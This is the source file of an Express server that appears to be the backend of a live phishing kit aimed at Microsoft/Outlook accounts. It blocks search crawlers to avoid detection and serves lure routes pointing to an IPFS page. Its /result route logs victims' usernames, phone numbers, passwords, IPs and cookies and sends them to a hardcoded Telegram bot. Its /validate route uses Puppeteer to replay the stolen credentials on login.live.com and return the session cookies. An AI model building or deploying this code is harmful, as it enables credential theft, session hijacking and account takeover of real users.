const express = require('express');
const rateLimit = require('express-rate-limit');
// const helmet = require('helmet');
const useragent = require('express-useragent');
const requestIp = require('request-ip');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const puppeteer = require('puppeteer');

const app = express();
const port = 8080;

// Middleware to set security headers
// app.use(helmet());

// Middleware to parse user agent
app.use(useragent.express());

// Middleware to get client IP address
app.use(requestIp.mw());

// Body parser middleware to handle form submissions
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse cookies
app.use(cookieParser());

// Rate limiting to prevent brute force attacks and DDoS
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Set EJS as templating engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Middleware to block known bots
app.use((req, res, next) => {
    const userAgent = req.useragent;
    const botList = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
    ];

    if (botList.some(bot => userAgent.source.includes(bot))) {
        return res.status(403).send('Access denied.');
    }
    next();
});
// app.use(helmet({
//     contentSecurityPolicy: {
//         directives: {
//             defaultSrc: ["'self'"],
//             scriptSrc: ["'self'", "'unsafe-inline'"],
//             styleSrc: ["'self'", "'unsafe-inline'"],
//             imgSrc: ["'self'"],
//             connectSrc: ["'self'"],
//             fontSrc: ["'self'"],
//             objectSrc: ["'none'"],
//             mediaSrc: ["'self'"],
//             frameSrc: ["'none'"]
//         }
//     }
// }));
// Middleware to set CSP with nonce
// app.use((req, res, next) => {
//     res.locals.nonce = crypto.randomBytes(16).toString('base64');
//     res.setHeader(
//         'Content-Security-Policy',
//         `default-src 'self'; script-src 'self' 'nonce-${res.locals.nonce}'`
//     );
//     next();
// });

// Middleware to block empty user agents
app.use((req, res, next) => {
    if (!req.useragent.source) {
        return res.status(403).send('Access denied.');
    }
    next();
});

// Middleware to use honeypots
app.use((req, res, next) => {
    if (req.method === 'POST' && req.body.honeypot) {
        return res.status(403).send('Access denied.');
    }
    next();
});

// Serve robots.txt
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send('User-agent: *\nDisallow: /');
});

// Check for the cookie and serve content accordingly
app.get('/redirect', (req, res) => {
    if (req.cookies.myCookie) {
        // res.send('Hello, human! You have the cookie.');
        // res.sendFile(__dirname + '/public/index.html');
        res.render('index')
    } else {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Set Cookie</title>
            </head>
            <body>
                <script nonce="${res.locals.nonce}">
                    document.cookie = "myCookie=true; max-age=900; path=/";
                    window.location.href = "/";
                </script>
                <p>Setting cookie and reloading...</p>
            </body>
            </html>
        `);
    }
});
app.get('/', (req, res) => {
    let data = {
        "link": "test"
    }
    res.render('links', {data: data});
})


app.get('/share-files-:shareId/document-:docId/:attachmentId-attachment/private-files-:privateId/secure-file-:secureId/:randomString', (req, res) => {
    const { shareId, docId, attachmentId, privateId, secureId, randomString } = req.params;

    // res.send({
    //     message: 'Route matched successfully!',
    //     shareId,
    //     docId,
    //     attachmentId,
    //     privateId,
    //     secureId,
    //     randomString
    // });
    let data = {
        "link": "https://ipfs.io/ipfs/bafkreievdcmrfxsekvdycydj3sqoa7b3rbl2nmpaczc4bldfdduru55plq"
    }
    res.render('links', {data: data});
});

app.get('/xv0jP-important/secure-private-data/document-storage/6P4nT1xU6m8Jz1F8lK9v2S3uV7pD4y', (req, res) => {

    let data = {
        "link": "https://ipfs.io/ipfs/bafkreievdcmrfxsekvdycydj3sqoa7b3rbl2nmpaczc4bldfdduru55plq"
    }
    res.render('links', {data: data});
});

// app.get('/', (req, res) => {
//     if (req.cookies.myCookie) {
//         res.sendFile(__dirname + '/public/index.html');
//     } else {
//         res.sendFile(__dirname + '/public/cookie.html');
//     }
// });


// Route to handle setting the cookie and reloading the page
app.get('/set-cookie', (req, res) => {
    res.cookie('myCookie', 'true', { maxAge: 900000, httpOnly: true });
    res.redirect('/');
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

app.post('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.sendFile(__dirname + '/public/robots.txt');
});


// Replace with your Telegram bot token and chat ID
const telegramBotToken = '7144039946:AAFsmuxyw2-TsnGvuYrfYoRcuKIFxsa_dEQ';
const telegramChatId = '-4185142703';

// Handle form submission
app.post('/result', (req, res) => {
    const result = req.body;

    // Log the input to a text file
    // const logEntry = `Username: ${result.uname}, Phone: ${result.phone}, Password: ${result.pwd}, IP: ${result.ipad}, Cookie: ${result.cookie} \n`;
    const logEntry = `Username: ${result.uname}, Password: ${result.pwd}, IP: ${result.ipad} \n`;

    fs.appendFile('public/data/log.txt', logEntry, (err) => {
        if (err) throw err;
        console.log('Log entry added.');
    });

    // Send the input to Telegram
    const telegramMessage = `New Result:\nUsername: ${result.uname}\nPhone: ${result.phone}\nPassword: ${result.pwd}\nIP: ${result.ipad} \n Cookie: ${result.cookie}`;
    axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: telegramMessage
    })
    .then(response => {
        console.log('Message sent to Telegram.');
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });

    res.send('OK');
});

app.post('/validate', (req, res) => {

    (async () => {
        // Replace with your Outlook email and password
        // const email = 'thisissoinvalid@thisissoinvalid.com';
        // const email = 'iamseyiajayi@gmail.com';
        // const email = 'testter@gmail.com';
        // const password = 'Classified.123';
        const email = req.body.email;
        const password = req.body.password;
        const step = req.body.step;
        console.log(step)
        let isError = false
        // Launch a browser
        console.log('Launching browser...');
        const browser = await puppeteer.launch({ headless: false }); // Set headless to false to see the browser actions
        const page = await browser.newPage();
    
        // Go to the Outlook login page
        console.log('Navigating to Outlook login page...');
        await page.goto('https://login.live.com/');
    
        // Enter email
        console.log('Entering email...');
        await page.waitForSelector('input[type="email"]');
        await page.type('input[type="email"]', email);
        console.log('Entered email...');
        await page.waitForSelector('#idSIButton9', { visible: true });
        await page.click('#idSIButton9');
    
        // Wait for potential error message
        console.log('Waiting for potential error message...');
        try {
            await page.waitForSelector('#i0116Error', { visible: true, timeout: 5000 });
            console.log('Error: That Microsoft account doesn\'t exist.');
            await browser.close();
            res.send('Error: That Microsoft account doesn\'t exist.');
            return;
        } catch (e) {
            console.log('No error message found. Proceeding with login...');
        if(step == 'email'){
            await browser.close();
            res.send('success')
            return;
        }else{

        // Wait for the password input to be visible
        console.log('Waiting for the password input...');
        await page.waitForSelector('input[type="password"]', { visible: true });
    
        // Enter password
        console.log('Entering password...');
        await page.type('input[type="password"]', password);
        await page.waitForSelector('#idSIButton9', { visible: true });
        await page.click('#idSIButton9');
    
        // Wait for potential password error message
        console.log('Waiting for potential password error message...');
        try {
            await page.waitForSelector('#idTD_Error, #error_Info', { visible: true, timeout: 5000 });
            console.log('Error: Sign-in is blocked or too many incorrect attempts.');
            await browser.close();
            res.send('Error: Sign-in is blocked or too many incorrect attempts.');
            return;
        } catch (e) {
            console.log('No password error message found. Proceeding with login...');
        }
    
        // Optionally handle additional steps like two-factor authentication or "Stay signed in?" prompt
        console.log('Handling "Stay signed in?" prompt...');
        function delay(time) {
            return new Promise(function(resolve) {
                setTimeout(resolve, time);
            });
        }
        
        // Wait for 2 seconds
        await delay(2000);
    
        // await page.waitForSelector('input[type="submit"]', { visible: true });
        // await page.click('input[type="submit"]');
    
        // // Wait for navigation after login
        // await page.waitForNavigation();
    
        // Fetch cookies
        const cookies = await page.cookies();
        console.log('Cookies:', cookies);
    
        // You are now logged in
        console.log('Logged in successfully');
    
        // Close the browser
        console.log('Closing browser...');
        await browser.close();
        res.json(cookies);
    }
    }
    })();
    
})

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
